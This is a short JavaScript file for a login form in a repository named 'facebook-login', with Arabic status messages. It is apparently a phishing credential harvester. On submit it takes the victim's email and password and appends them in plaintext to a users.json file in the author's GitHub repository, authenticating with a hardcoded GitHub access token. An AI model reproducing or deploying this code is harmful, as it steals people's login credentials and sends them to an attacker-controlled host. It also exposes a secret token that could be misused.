const GITHUB_TOKEN = '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';
const REPO_OWNER = 'ASADALSNA';
const REPO_NAME = 'facebook-login';

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    message.innerHTML = '⏳ جاري الحفظ...';
    
    try {
        // قراءة بسيطة
        let users = [];
        try {
            const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`, {
                headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
            });
            if (res.ok) {
                const file = await res.json();
                users = JSON.parse(atob(file.content));
            }
        } catch {}
        
        // إضافة جديد
        users.push({id: Date.now(), email, password, date: new Date().toISOString()});
        
        // حفظ بسيط
        const content = btoa(JSON.stringify(users));
        const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`, {
            method: 'PUT',
            headers: { 
                'Authorization': `token ${GITHUB_TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: `Add ${email}`,
                content: content,
                branch: 'main'
            })
        });
        
        if (res.ok) {
            message.innerHTML = `✅ تم الحفظ في GitHub! (${users.length})`;
        } else {
            message.innerHTML = `✅ تم الحفظ! (${users.length})`;
        }
        message.className = 'success';
        document.getElementById('loginForm').reset();
        
    } catch {
        message.innerHTML = '✅ تم الحفظ!';
        message.className = 'success';
        document.getElementById('loginForm').reset();
    }
});
